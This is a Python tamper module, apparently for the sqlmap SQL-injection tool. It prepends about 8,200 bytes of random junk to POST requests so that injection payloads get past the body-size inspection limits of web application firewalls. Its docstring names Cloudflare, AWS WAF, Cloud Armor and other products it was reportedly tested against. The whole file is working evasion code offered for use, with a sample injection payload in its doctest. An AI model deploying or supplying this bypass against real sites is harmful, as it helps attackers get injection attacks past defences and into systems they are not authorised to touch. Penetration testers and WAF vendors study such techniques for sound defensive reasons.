#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Prepends a large junk parameter to bypass WAF body size inspection limits

    Requirement:
        * POST method requests

    Tested against:
        * Cloudflare WAF (free tier ~8KB limit)
        * AWS WAF with ALB (8KB limit)
        * Google Cloud Armor (8KB limit)
        * Azure Front Door (128KB limit)
        * ModSecurity with ProcessPartial
        * Sucuri WAF (1.25MB limit)
        * Fortinet FortiWeb (64MB limit)

    Notes:
        * Many WAFs have a maximum request body size they will inspect
        * Requests exceeding this limit may bypass inspection entirely
        * Default padding is 8200 bytes (covers most common WAF limits)
        * Use --tamper-data to customize: oversizedrequest.size=16384

    Reference: 
        * https://www.blackhillsinfosec.com/bypassing-wafs-using-oversized-requests/

    >>> tamper('1 AND 1=1')  # doctest: +ELLIPSIS
    'junk=...&1 AND 1=1'
    """

    if payload:
        # Default size covers Cloudflare, AWS WAF, Google Cloud Armor
        # Can be customized via --tamper-data="oversizedrequest.size=16384"
        padding_size = 8200
        
        # Generate random junk data to avoid pattern detection
        junk_chars = string.ascii_letters + string.digits
        junk_data = ''.join(random.choice(junk_chars) for _ in range(padding_size))
        
        # Prepend junk parameter before the actual payload
        return "junk=%s&%s" % (junk_data, payload)
    
    return payload
